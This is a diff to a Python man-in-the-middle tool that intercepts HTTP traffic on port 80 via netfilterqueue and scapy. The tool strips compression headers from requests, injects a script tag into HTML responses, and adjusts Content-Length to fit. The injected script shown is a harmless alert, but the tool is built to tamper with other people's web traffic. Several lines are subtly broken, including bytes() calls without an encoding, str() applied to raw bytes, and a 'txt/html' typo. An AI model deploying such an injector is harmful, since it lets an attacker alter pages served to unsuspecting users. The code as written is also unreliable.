@@ -24,14 +24,22 @@ def process_packet(packet):
         if scapy_packet[scapy.TCP].dport == 80:      
             print("[+] Request")
             # Delete Accept-Encoding and its content
-            load = re.sub("Accept-Encoding:.*?\\r\\n","", load)
+            load = re.sub("Accept-Encoding:.*?\\r\\n","", str(load))
         elif scapy_packet[scapy.TCP].sport == 80:
             print("[+] Response")
-            load = load.replace("</head>", "<script>alert('test');</script></head>")
-            content_length_search = re.search("Content-Length:<\s\d*", load)
+            injection_code = "<script>alert('test');</script>"
+            load = str(load.replace(bytes("</head>"), bytes(injection_code) + bytes("</head>")))
+            # The new load make it content-length bigger so we need to change it
+            content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
+            if content_length_search and "txt/html" in load:
+                print("Old content_length: " + str(content_length_search.group(1)))
+                content_length = content_length_search.group(1)
+                new_content_length = int(content_length) + len(injection_code)
+                load = load.replace(content_length, str(new_content_length))
+                print("New content_length: " + str(new_content_length))
         if load != scapy_packet[scapy.Raw].load:
             new_packet = set_load(scapy_packet, load)
-            packet.set_payload(str(new_packet))    
+            packet.set_payload(bytes(new_packet))    
     packet.accept()
 
 queue = netfilterqueue.NetfilterQueue()
